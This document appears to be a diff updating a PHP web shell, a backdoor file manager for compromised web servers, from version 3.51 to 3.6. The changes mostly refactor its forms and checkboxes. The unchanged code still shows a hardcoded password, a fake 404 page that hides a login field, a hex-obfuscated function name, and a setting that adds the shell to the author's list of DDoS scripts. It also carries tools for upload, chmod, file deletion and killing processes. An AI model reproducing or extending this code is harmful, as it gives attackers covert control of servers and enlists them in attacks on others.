@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.51;
+$version            = 3.6;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -448,11 +448,11 @@ function orsc(){
  document.onreadystatechange = function() {
      orsc();
  }
-function CheckAll(form) {
+function CheckAll(form, cval) {
 	for(var i=0;i<form.elements.length;i++) {
 		var e = form.elements[i];
-		if (e.name != \'chkall\')
-		e.checked = form.chkall.checked;
+		if (e.name == \'chkall\' || e.name == \'chkallbx\' || e.name == \'dl[]\')
+		e.checked = cval;//form.chkall.checked;
     }
 }
 function $(id) {
@@ -628,6 +628,75 @@ function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writa
 </head>
 <body style="margin:0;table-layout:fixed; word-break:break-all">
 ';
+    formhead(array("name"=>"godir"));
+    makehide("view_writable", 0);
+    makehide("dir", $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'createdir'
+    ));
+    makehide('newdirname');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'fileperm'
+    ));
+    makehide('newperm');
+    makehide('pfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'copyfolder'
+    ));
+    makehide('srcdir');
+    makehide('tofolder');
+    makehide('dir',$nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'copyfile'
+    ));
+    makehide('sname');
+    makehide('tofile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'unzipfile'
+    ));
+    makehide('unzipfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'ungzfile'
+    ));
+    makehide('ungzfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'untarfile'
+    ));
+    makehide('untarfile');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'rename'
+    ));
+    makehide('oldname');
+    makehide('newfilename');
+    makehide('dir', $nowpath);
+    formfoot();
+    formhead(array(
+        'name' => 'fileopform'
+    ));
+    makehide('action');
+    makehide('opfile');
+    makehide('dir');
+    formfoot();
+    formhead(array(
+        'name' => 'getsize'
+    ));
+    makehide('getdir');
+    makehide('dir');
+    formfoot();
 formhead(array(
     'name' => 'opform'
 ));
@@ -653,11 +722,6 @@ $nowpath = getPath(SA_ROOT, $dir);
 if (substr($dir, -1) != '/') {
     $dir = $dir . '/';
 }
-p('<form id="filelist" name="filelist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
-makehide('action', 'file');
-makehide('thefile');
-makehide('doing');
-makehide('dir', $nowpath);
 if (!$sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x65\x67\x69\x64")) {//placemarkerhere
     $user  = @get_current_user();
     $uid   = @getmyuid();
@@ -734,8 +798,7 @@ echo '<div class="blocktop"><a href="javascript:g(\'settings\');">Shell Settings
 			<div class="blocktop"><a href="javascript:g(\'logout\');">Logout</a></div>
 			</div></div></td>
 	</tr>
-</table>
-<table id="maintable" width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
+</table><table id="maintable" width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
 ';
 $errmsg && m($errmsg);
 if (isset($_SESSION[$prefixme.'updateready']) && time() > $_SESSION[$prefixme.'updateready']){
@@ -972,71 +1035,6 @@ if ($action == 'phpinfo') {
         recurse_copy($srcdir,$tofolder);
             m('Copy Folder has finished.');
     }
-    formhead(array(
-        'name' => 'createdir'
-    ));
-    makehide('newdirname');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'fileperm'
-    ));
-    makehide('newperm');
-    makehide('pfile');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'copyfolder'
-    ));
-    makehide('srcdir');
-    makehide('tofolder');
-    makehide('dir',$nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'copyfile'
-    ));
-    makehide('sname');
-    makehide('tofile');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'unzipfile'
-    ));
-    makehide('unzipfile');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'ungzfile'
-    ));
-    makehide('ungzfile');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'untarfile'
-    ));
-    makehide('untarfile');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'rename'
-    ));
-    makehide('oldname');
-    makehide('newfilename');
-    makehide('dir', $nowpath);
-    formfoot();
-    formhead(array(
-        'name' => 'fileopform'
-    ));
-    makehide('action');
-    makehide('opfile');
-    makehide('dir');
-    formfoot();
-    formhead(array(
-        'name' => 'getsize'
-    ));
-    makehide('getdir');
-    makehide('dir');
-    formfoot();
     echo '<div id="astatus" style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;display:none;"></div>';
     $free = @disk_free_space($nowpath);
     !$free && $free = 0;
@@ -1090,22 +1088,19 @@ function shownav(e){
 		</tr>
 	</table>
 	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
-	<form action="" method="post" id="godir" name="godir" onSubmit="window.onbeforeunload = null;">
-		<tr>
-			<td nowrap>Current Directory (';
+	<tr><td nowrap>Current Directory (';
     echo $dir_writeable;
     ;
     echo ', ';
     echo getChmod($nowpath);
     ;
     echo ')</td>
-			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input onmouseover="this.focus();" class="input" name="dir" value="';
+			<td width="100%"><input id="userdir" onkeypress="if (event.keyCode == 13){ event.preventDefault(); window.godir(this.value); return false;}" onmouseover="this.focus();" class="input" name="dir" value="';
     echo $nowpath;
     ;
     echo '" type="text" style="width:99%;margin:0 8px;"></td>
-			<td nowrap><input class="bt" value="GO" type="submit"></td>
+			<td nowrap><input class="bt" value="GO" type="button" onclick="window.godir($(\'userdir\').value);"></td>
 		</tr>
-	</form>
 	</table>
 ';
     if (IS_WIN && IS_COM) {
@@ -1172,9 +1167,18 @@ function shownav(e){
 		xhr.send(formData);
 	}
 }</script>';
+formhead(array("name"=>'fuf','enctype'=>'multipart/form-data'));
+makehide("uploaddir", $nowpath);
+makehide("dir", $nowpath);
+formfoot();
+formhead(array("name"=>'filelist'));
+makehide('action', 'file');
+makehide('thefile');
+makehide('doing');
+makehide('dir', $nowpath);
     tbhead("thefilelist");
     p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
-    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;"><div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $nowpath . '" type="hidden" /><input name="dir" value="' . $nowpath . '" type="hidden" /></div></form>');
+    p('<div style="float:right;"><input class="input" name="uploadfile[]" multiple="multiple" value="" type="file" form="fuf"/> <input class="bt" name="doupfile" value="Upload" type="submit" form="fuf"/></div>');
     p('<a href="javascript:godir(\'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">WebRoot</a>');
     p(' | <a href="javascript:godir(\'' . str_replace('\\', '/', str_replace("'", "\'", getcwd())) . '\');">ScriptPath</a>');
     p(' | <a href="javascript:godir(\'' . str_replace("'", "\'", $nowpath) . '\');">View All</a>');
@@ -1187,7 +1191,7 @@ function shownav(e){
         'selected' => $findin,
         'nokey' => 1));
     p('<input name="dir" value="' . $dir . '" type="hidden" /> <label><input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular Expressions</label> <label><input name="subdirs" value="1" type="checkbox" ' . ($subdirs ? 'checked' : '') . ' /> Search Subdirectories</label></form></div></td></tr>');
-   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
+    p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
 	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
 	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . htmlentities($findstr) . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . htmlentities($writabledb) . '\', \'' . ($subdirs ? '1' : '0') . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
     p('<td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
@@ -1371,8 +1375,8 @@ function shownav(e){
     }
     }
     p('<tr class="head"><td></td><td>File Name</td><td width="16%">Last Modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
-    p('<tr class="' . bg() . '"><td align="center"><input id= "ckallbx" name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete Selected</a> | <a href="javascript:dofile(\'zipfiles\');">Zip Selected</a></td><td align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
-    p('</form></table>');
+    p('<tr class="' . bg() . '"><td align="center"><input id= "ckallbx" name="chkallbx" value="on" type="checkbox" onclick="CheckAll(this.form, this.checked)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete Selected</a> | <a href="javascript:dofile(\'zipfiles\');">Zip Selected</a></td><td align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
+    p('</table></form>');
 }elseif ($action == 'settings'){
 	if (isset($setpass) && isset($setpass2)){
 		if (($setpass2 == $setpass)){
@@ -1584,7 +1588,7 @@ $wcount = 11;
 
 
 
-p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="11"><a href="javascript:killprocm(\'killproc\');">Kill selected</a></td><td align="right">' . $proccount . ' process(es)</td></tr>');
+p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form, this.checked)" /></td><td colspan="11"><a href="javascript:killprocm(\'killproc\');">Kill selected</a></td><td align="right">' . $proccount . ' process(es)</td></tr>');
 p('</table></form>');
 formfoot();
 } elseif ($action == 'sqlfile') {
@@ -3790,7 +3794,7 @@ function formhead($arg = array())
     !$arg['action'] && $arg['action'] = $self;
     $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
     !$arg['name'] && $arg['name'] = 'form1';
-    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" onSubmit=\"window.onbeforeunload = null;\" method=\"$arg[method]\" $arg[target]>");
+    p("<form name=\"$arg[name]\" id=\"$arg[name]\" enctype=\"$arg[enctype]\" action=\"$arg[action]\" onSubmit=\"window.onbeforeunload = null;\" method=\"$arg[method]\" $arg[target]>");
     if ($arg['title']) {
         p('<h2>' . $arg['title'] . '</h2>');
     }
